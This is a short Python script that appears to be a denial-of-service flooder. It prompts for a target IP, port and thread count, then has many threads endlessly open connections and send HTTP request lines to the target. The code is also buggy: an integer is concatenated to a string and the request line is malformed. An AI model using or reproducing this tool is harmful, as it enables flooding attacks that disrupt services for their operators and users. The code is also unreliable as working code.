import sys
import time
import socket
import threading
import requests

URL = str(input("You web ip: "))
port = int(input("Your port: "))
tread = int(input("Insert number of threads: "))

anunim = int(input("Masukan anonim ip: "))

def main():
    while True:
        try:
            sook = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sook.connect((URL, port))
            sook.sendto(("GET /" + URL + "HTTP/1.1\r\n").encode('ascii'),(URL, port))
            sook.sendto(("Host: " + anunim + "\r\n\r\n").encode('ascii'), (URL, port))

        except Exception as e:
            print(f"condision Error: {e}")
            sook.close()

for i in range(tread):
    tdr = threading.Thread(target=main)
    tdr.start()